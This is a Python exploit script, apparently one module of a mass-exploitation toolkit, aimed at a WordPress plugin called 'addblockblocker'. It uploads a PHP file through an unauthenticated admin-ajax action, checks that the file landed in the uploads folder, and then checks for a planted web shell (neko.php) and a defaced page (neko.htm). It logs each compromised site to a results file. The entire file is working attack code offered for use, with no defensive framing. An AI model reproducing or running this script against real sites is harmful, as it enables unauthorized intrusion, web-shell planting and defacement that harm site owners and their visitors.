# coding=utf-8
import requests, time
import printModule

pagelinesExploitShell = 'files/settings_auto.php'
Headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'
}
year = time.strftime("%y")
month = time.strftime("%m")

def Exploit(site):
    try:
        ShellFile = {'popimg': open(pagelinesExploitShell, 'rb')}
        Exp = 'http://' + site + '/wp-admin/admin-ajax.php?action=getcountryuser&cs=2'
        requests.post(Exp, files=ShellFile, timeout=10, headers=Headers)
        CheckShell = 'http://' + site + '/wp-content/uploads/20' + year + '/' + month + '/' \
                     + pagelinesExploitShell.split('/')[1]
        GoT = requests.get(CheckShell, timeout=10, headers=Headers)
        if GoT.status_code == 200:
            CheckShell = requests.get('http://' + site + '/wp-content/neko.php', timeout=10, headers=Headers)
            CheckIndex = requests.get('http://' + site + '/neko.htm', timeout=10, headers=Headers)
            if 'neko!!' in CheckShell.content:
                with open('result/Shell_results.txt', 'a') as writer:
                    writer.write(site + '/wp-content/neko.php' + '\n')
                if 'neko!!' in CheckIndex.content:
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/neko.htm' + '\n')
                return printModule.returnYes(site, 'N/A', 'addblockblocker', 'Wordpress')
            else:
                return printModule.returnNo(site, 'N/A', 'addblockblocker', 'Wordpress')
        else:
            return printModule.returnNo(site, 'N/A', 'addblockblocker', 'Wordpress')
    except:
        return printModule.returnNo(site, 'N/A', 'addblockblocker', 'Wordpress')
